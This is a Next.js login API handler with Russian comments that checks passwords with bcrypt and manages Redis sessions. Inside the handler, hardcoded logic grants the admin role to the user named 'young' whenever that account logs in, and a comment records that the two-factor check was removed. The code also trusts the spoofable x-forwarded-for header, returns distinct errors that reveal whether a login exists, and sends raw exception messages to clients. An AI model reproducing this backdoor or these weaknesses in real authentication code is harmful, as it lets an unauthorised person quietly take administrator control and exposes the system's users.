import type { NextApiRequest, NextApiResponse } from "next";
import bcrypt from "bcryptjs";
import prisma from "../../../lib/prisma";
import { createSessionRedis, deactivateOtherSessions } from '../../../lib/redis';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== "POST") return res.status(405).end();
  try {
  const { login, password } = req.body;
    if (!login || !password) return res.status(400).json({ error: "Login and password required" });
    const user = await prisma.user.findUnique({
      where: { login },
      include: {}, // получаем все поля, включая role
    });
    if (!user) return res.status(401).json({ error: "User not found" });
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return res.status(401).json({ error: "Invalid password" });
    // ...удалено: проверка twoFactorToken...
    // Назначить роль админа пользователю 'young' при входе
    let role = (user as any).role || 'user';
    if (user.login === 'young' && role !== 'admin') {
      await prisma.user.update({
        where: { id: user.id },
        data: { role: 'admin' } as any // принудительно типизация для обхода ошибки
      });
      role = 'admin';
    }
    // Create new session for this login
    let deviceName = req.headers['user-agent'] || 'Unknown device';
    // Сохраняем только название браузера
    let browserName = 'Unknown';
    if (typeof deviceName === 'string') {
      if (deviceName.includes('Firefox')) browserName = 'Firefox';
      else if (deviceName.includes('Edg')) browserName = 'Edge';
      else if (deviceName.includes('Chrome')) browserName = 'Chrome';
      else if (deviceName.includes('Safari')) browserName = 'Safari';
      else browserName = deviceName.split(' ')[0];
    }
  // Определяем IP клиента
  const ip = (req.headers['x-forwarded-for'] as string) || (req.socket && req.socket.remoteAddress) || null;
  // Создаём новую сессию в Redis
  const newSession = await createSessionRedis(user.id, browserName, ip as string | null);
    // Завершаем все остальные сессии пользователя, кроме текущей
    await deactivateOtherSessions(user.id, newSession.id);
    return res.status(200).json({ user: { id: user.id, login: user.login, role } });
  } catch (e: any) {
    console.error("/api/auth/login error:", e);
    return res.status(500).json({ error: e.message || "Internal server error" });
  }
}
